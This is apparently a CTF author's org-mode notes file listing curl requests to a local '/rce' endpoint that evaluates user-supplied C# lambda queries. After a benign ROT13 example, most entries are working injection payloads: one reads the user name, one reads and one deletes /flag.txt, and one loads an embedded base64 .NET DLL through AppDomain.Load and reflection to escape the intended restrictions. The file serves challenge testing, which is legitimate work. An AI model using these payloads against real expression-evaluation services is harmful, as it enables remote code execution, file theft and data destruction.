Test connectivity:
#+begin_src sh
curl --request GET --url http://localhost:8002/
#+end_src

ROT13:
#+begin_src sh
curl --request POST \
      --url http://localhost:8002/rce \
      --header 'Content-Type: application/json' \
      --data '{
  "Data": ["hello", "crypto", "lena", "LosFuzzys"],
  "Query": "(data) => data.Select(d => !string.IsNullOrEmpty(d) ? new string (d.ToCharArray().Select(s =>  { return (char)(( s >= 97 && s <= 122 ) ? ( (s + 13 > 122 ) ? s - 13 : s + 13) : ( s >= 65 && s <= 90 ? (s + 13 > 90 ? s - 13 : s + 13) : s )); }).ToArray() ) : d)"
  }'
#+end_src

Environment.User:
#+begin_src sh
curl --request POST \ --url http://localhost:8002/rce \
      --header 'Content-Type: application/json' \
      --data '{
  "Data": ["placeholder"],
  "Query": "(data) => data.Select(d => Environment.UserName)"
  }'
#+end_src

System.IO solution (shouldn't work!):
#+begin_src sh
curl --request POST \ --url http://localhost:8002/rce \
      --header 'Content-Type: application/json' \
      --data '{
  "Data": ["placeholder"],
  "Query": "(data) => data.Select(d => System.IO.File.ReadAllText(\"/flag.txt\"))"
  }'
#+end_src

Dll solution:
#+begin_src sh
curl --request POST \
  --url http://localhost:8002/rce \
  --header 'Content-Type: application/json' \
  --data '{
        "Data": ["GEBIRGE"],
        "Query": "(data) => data.Select((d) => { var dll = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAEGB45gAAAAAAAAAAOAAIiALATAAAAoAAAAGAAAAAAAAWigAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAAUoAABPAAAAAEAAABwDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAA4JwAAVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAYAgAAAAgAAAACgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAABwDAAAAQAAAAAQAAAAMAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAEAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAA5KAAAAAAAAEgAAAACAAUAnCAAAJwGAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB4CKA0AAAoqXgIoDQAACgIXjREAAAElFgOcfQEAAAQqOgIoDQAACgIDfQEAAAQqOgIoDQAACgIDfQIAAAQqLnIBAABwKA4AAAoqAABCU0pCAQABAAAAAAAMAAAAdjQuMC4zMDMxOQAAAAAFAGwAAAA8AgAAI34AAKgCAACYAgAAI1N0cmluZ3MAAAAAQAUAABgAAAAjVVMAWAUAABAAAAAjR1VJRAAAAGgFAAA0AQAAI0Jsb2IAAAAAAAAAAgAAAVcUAAAJAAAAAPoBMwAWAAABAAAAEgAAAAUAAAACAAAABQAAAA4AAAATAAAAAQAAAAEAAAAAANYBAQAAAAAABgAlASACBgCQASACBgBtAA0CDwBAAgAABgCqALwBBgB3AeoBBgAGAeoBBgDDAOoBBgDgAOoBBgBFAeoBBgCTAOoBBgA6ACACBgCkAeMBBgB0AuMBBgBVAOMBBgCFAuMBBgCuAeMBBgAUAAoAAAAAAAEAAAAAAAEAAQAAARAAKABdAjUAAQABAAABEACBACACNQABAAIAAAEQAF4BIAI1AAIABACBARAA/AEAAEEAAwAFACYATwIpACYAtwEtAFAgAAAAAIYYBwIGAAEAWCAAAAAAhhgHAjAAAQBwIAAAAACGGAcCNQABAH8gAAAAAIYYBwIwAAEAjiAAAAAAlgCzATsAAQAJAAcCAQARAAcCBgAZAAcCCgApAAcCEAAxAAcCEAA5AAcCEABBAAcCEABJAAcCEABRAAcCEABZAAcCEABhAAcCBgB5AAcCFQBpAAcCBgCRAIwCGwAuAAsAPwAuABMASAAuABsAZwAuACMAcAAuACsApgAuADMAtAAuADsAwQAuAEMAzgAuAEsApgAuAFMApgBDAFsA3wBDAAoA3wBjAFsA3wBjAAoA3wBjAGMA5ACDAFsA3wCDAAoA3wCDAGMACwGgACIA2QAEgAAAAQAAAAAAAAAAAAAAAACzAQAABgAAAAAAAAAAAAAAIAAZAAAAAAAAAAA8TW9kdWxlPgBTeXN0ZW0uSU8ARmlsZQBTeXN0ZW0uUnVudGltZQBFbWJlZGRlZEF0dHJpYnV0ZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBBdHRyaWJ1dGVVc2FnZUF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAE51bGxhYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAVGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlJbmZvcm1hdGlvbmFsVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUATnVsbGFibGVDb250ZXh0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBCeXRlAFJlYWRGbGFnAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAUmVhZEZsYWcuZGxsAFN5c3RlbQBTeXN0ZW0uUmVmbGVjdGlvbgBGbGFnUmVhZGVyAC5jdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAE51bGxhYmxlRmxhZ3MATWljcm9zb2Z0LkNvZGVBbmFseXNpcwBBdHRyaWJ1dGVUYXJnZXRzAE9iamVjdABSZWFkQWxsVGV4dAAAEy8AZgBsAGEAZwAuAHQAeAB0AAAAAAAG9/GCY1b0T50C11v/pXlyAAQgAQEIAyAAAQUgAQEREQQgAQEOBSABARE5BAABDg4IsD9ffxHVCjoDBh0FAgYFBCABAQUFIAEBHQUDAAAOCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQgBAAIAAAAAADUBABguTkVUQ29yZUFwcCxWZXJzaW9uPXY2LjABAFQOFEZyYW1ld29ya0Rpc3BsYXlOYW1lAA0BAAhSZWFkRmxhZwAADAEAB1JlbGVhc2UAAAwBAAcxLjAuMC4wAAAKAQAFMS4wLjAAAAUBAAEAAAQBAAAAJgEAhGsAAAIAVAINQWxsb3dNdWx0aXBsZQBUAglJbmhlcml0ZWQAJgEATBQAAAIAVAINQWxsb3dNdWx0aXBsZQBUAglJbmhlcml0ZWQAAAAAAAAA42qC8QABTVACAAAAUgAAAIwnAACMCQAAAAAAAAAAAAABAAAAEwAAACcAAADeJwAA3gkAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RTurdl1xoLIEKoNR6EGKgUXAEAAABDOlxTb3VyY2VcR2l0bGFiXFJlYWRGbGFnXG9ialxSZWxlYXNlXG5ldDYuMFxSZWFkRmxhZy5wZGIAU0hBMjU2ALq3ZdcaCyAS6DUehBioFFzjaoLxRL14dzGkrZmN1LLGLSgAAAAAAAAAAAAARygAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAADkoAAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAAAAAP8lwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAAMACAAAAAAAAAAAAAMACNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAQgAgAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAAD8AQAAAQAwADAAMAAwADAANABiADAAAAAyAAkAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAAFIAZQBhAGQARgBsAGEAZwAAAAAAOgAJAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAFIAZQBhAGQARgBsAGEAZwAAAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4AMAAuADAALgAwAAAAOgANAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABSAGUAYQBkAEYAbABhAGcALgBkAGwAbAAAAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAAEIADQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABSAGUAYQBkAEYAbABhAGcALgBkAGwAbAAAAAAAMgAJAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABSAGUAYQBkAEYAbABhAGcAAAAAADAABgABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAAXDgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"; var assembly = AppDomain.CurrentDomain.Load(Convert.FromBase64String(dll)); var flagReader = assembly.GetType(\"FlagReader\"); var readFlag = flagReader.GetMethod(\"ReadFlag\"); var contents = readFlag.Invoke(null, null); return contents;})"}'
#+end_src

Delete flag (we shouldn't be able to!):
#+begin_src sh
curl --request POST \ --url http://localhost:8002/rce \
      --header 'Content-Type: application/json' \
      --data '{
  "Data": ["placeholder"],
  "Query": "(data) => data.Select(d => {System.IO.File.Delete(\"/flag.txt\"); return \"ROFL\";})"
  }'
#+end_src
